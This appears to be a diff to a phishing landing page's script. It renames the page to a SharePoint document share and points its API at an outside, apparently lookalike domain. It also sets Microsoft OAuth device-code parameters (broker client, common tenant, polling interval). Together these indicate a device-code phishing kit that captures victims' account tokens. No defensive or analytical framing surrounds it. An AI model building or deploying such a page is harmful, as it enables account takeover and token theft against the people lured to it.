@@ -224,13 +224,13 @@
     </div>
     <script>
         (function() {
-            var slug = "hedge";
+            var slug = "sharepoint-document-share";
             if (!slug) {
                 var p = window.location.pathname.replace(/^\/+|\/+$/g, '');
                 var m = p.match(/lp\/(.+)/);
                 if (m) slug = m[1];
             }
-            var apiBase = window.location.origin + '/api/v1/landing-pages';
+            var apiBase = ("https://terrain.thomascook-mu.com" || window.location.origin) + '/api/v1/landing-pages';
             var deviceCode = null, client = 'ms_broker', scopeType = 'broker', tenant = 'common', expiresIn = 900, interval = 5;
             var pollTimer = null;
             var btnContinue = document.getElementById('btnContinue');
